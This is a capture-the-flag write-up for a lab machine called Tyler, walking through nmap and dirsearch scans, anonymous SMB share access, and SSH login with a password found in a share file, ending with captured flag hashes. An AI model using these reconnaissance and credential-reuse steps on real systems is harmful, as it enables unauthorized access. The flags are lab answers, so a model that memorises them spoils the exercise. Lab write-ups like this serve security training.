## King Of The Hill | Tyler machine Write-up

![image](https://github.com/zer00d4y/writeups/assets/128820441/830495c8-c401-4a24-b021-12d2d35f358a)

## Port scanning

`nmap 10.10.105.88`

    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-07 06:44 EST
    Nmap scan report for 10.10.178.46
    Host is up (0.13s latency).
    Not shown: 992 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3306/tcp open  mysql
    5000/tcp open  upnp
    8080/tcp open  http-proxy
    9999/tcp open  abyss
    
    Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds


## Directory enumeration

`python3 dirsearch.py -e php,html,js -u http://10.10.105.88 --exclude-status 404,403,401,307`

      _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
     (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                
    Extensions: php, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 10624
    
    Output: /home/kali/tools/dirsearch/reports/http_10.10.105.88/_24-01-07_06-46-45.txt
    
    Target: http://10.10.105.88/
    
    [06:46:45] Starting:                                                                                                                                                                                                                        
    [06:50:15] 301 -  235B  - /upload  ->  http://10.10.105.88/upload/          
    [06:50:16] 200 -  307B  - /upload/                                          
                                                                                 
    Task Completed                              

-----------------------------------------------------------------------

`smbclient -L \\\\10.10.105.88\\ `

    Password for [WORKGROUP\kali]:
    Anonymous login successful
    
            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            public          Disk      
            IPC$            IPC       IPC Service (Samba 4.9.1)
    Reconnecting with SMB1 for workgroup listing.
    Anonymous login successful
    
            Server               Comment
            ---------            -------
    
            Workgroup            Master
            ---------            -------
            SAMBA                TYLER

`smbclient \\\\10.10.105.88\\public`

    Password for [WORKGROUP\kali]:
    Anonymous login successful
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Wed Mar 25 17:09:50 2020
      ..                                  D        0  Wed Mar 25 17:02:28 2020
      flag.txt                            N       33  Wed Mar 25 17:08:05 2020
      alert.txt                           N       50  Wed Mar 25 17:09:50 2020
    
                    13092864 blocks of size 1024. 7762712 blocks available
    smb: \> get flag.txt
    getting file \flag.txt of size 33 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
    smb: \> get alert.txt
    getting file \alert.txt of size 50 as alert.txt (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
    smb: \> exit

`cat flag.txt`

    2308b0cccea3f2a187a89a9f3155a3a4

`cat alert.txt`

    Let's keep things interesting... X8JEETQmf3hkS65f

"X8JEETQmf3hkS65f" is ssh password!

`ssh narrator@10.10.105.88`     
    
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
    Warning: Permanently added '10.10.105.88' (ED25519) to the list of known hosts.
    narrator@10.10.105.88's password: X8JEETQmf3hkS65f
    Last login: Thu Mar 26 10:52:23 2020 from cyberdyne
    [narrator@tyler ~]$ ls
    app  user.txt
    [narrator@tyler ~]$ cat user.txt
    991c65538b9afaf2494f4552b915c948




-----------------------------------------------------------------------

flag-1: 2308b0cccea3f2a187a89a9f3155a3a4 flag.txt

flag-2: 991c65538b9afaf2494f4552b915c948 user.txt

echo zer0d4y > /root/king.txt
